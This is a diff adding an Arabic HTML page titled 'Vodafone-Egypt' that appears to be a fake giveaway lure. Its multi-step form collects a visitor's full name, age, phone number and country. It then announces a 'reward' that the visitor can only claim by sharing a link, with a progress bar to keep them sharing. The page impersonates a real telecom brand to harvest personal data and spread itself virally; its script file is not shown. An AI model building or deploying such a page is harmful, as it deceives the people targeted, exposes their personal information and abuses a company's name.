@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vodafone-Egypt</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="form-container">
+        <div id="step1">
+            <h2>الخطوة 1: الاسم</h2>
+            <input type="text" id="firstName" placeholder="الاسم الأول" required>
+            <input type="text" id="middleName" placeholder="الاسم الأوسط" required>
+            <input type="text" id="lastName" placeholder="اسم العائلة" required>
+            <input type="text" id="familyName" placeholder="الاسم الأخير" required>
+            <button onclick="nextStep('step1', 'step2')">التالي</button>
+        </div>
+
+        <div id="step2" class="hidden">
+            <h2>الخطوة 2: العمر</h2>
+            <input type="number" id="age" placeholder="ادخل عمرك" required>
+            <button onclick="nextStep('step2', 'step3')">التالي</button>
+        </div>
+
+        <div id="step3" class="hidden">
+            <h2>الخطوة 3: رقم الهاتف</h2>
+            <input type="text" id="phone" placeholder="ادخل رقم هاتفك" pattern="\d{11}" title="يجب أن يكون رقم الهاتف 11 رقماً" required>
+            <button onclick="nextStep('step3', 'step4')">التالي</button>
+        </div>
+
+        <div id="step4" class="hidden">
+            <h2>الخطوة 4: الدولة</h2>
+            <select id="country" required>
+                <option value="">اختر دولتك</option>
+                <option value="مصر">مصر</option>
+                <option value="السعودية">السعودية</option>
+                <option value="الإمارات">الإمارات</option>
+                <option value="الأردن">الأردن</option>
+                <option value="لبنان">لبنان</option>
+                <option value="عمان">عمان</option>
+                <option value="الكويت">الكويت</option>
+                <option value="قطر">قطر</option>
+                <option value="البحرين">البحرين</option>
+                <option value="اليمن">اليمن</option>
+                <!-- أضف دول أخرى حسب الحاجة -->
+            </select>
+            <button onclick="submitForm()">تقديم</button>
+        </div>
+
+        <div id="reward" class="hidden">
+            <h2>شكراً!</h2>
+            <p>لقد حصلت على مكافأتك! شارك هذا الرابط للحصول عليها:</p>
+            <div class="copy-container">
+                <input type="text" id="share-link" readonly>
+                <button onclick="copyLink()">نسخ الرابط</button>
+            </div>
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <span id="progress-text">0%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="scripts.js"></script>
+    
+</body>
+</html>
